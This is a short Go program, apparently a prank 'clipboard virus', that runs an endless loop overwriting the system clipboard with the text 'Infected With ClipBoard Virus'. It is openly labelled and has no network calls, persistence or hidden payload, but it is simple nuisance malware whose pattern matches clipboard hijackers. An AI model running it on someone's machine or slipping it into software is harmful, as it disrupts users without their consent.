package main

import (
	"github.com/atotto/clipboard"
)

func main() {
	for true{
		//Change the string to whatever you want
		var str string = "Infected With ClipBoard Virus" 

		//Writing clipboard value to string value
		clipboard.WriteAll(str)

		//Reading clipboard value and store as "text" variable
		text, _ := clipboard.ReadAll()

		//This logic is not necessary 
		if(text != str){
			clipboard.WriteAll(str)
		}else{
			continue
		}
		
	}
}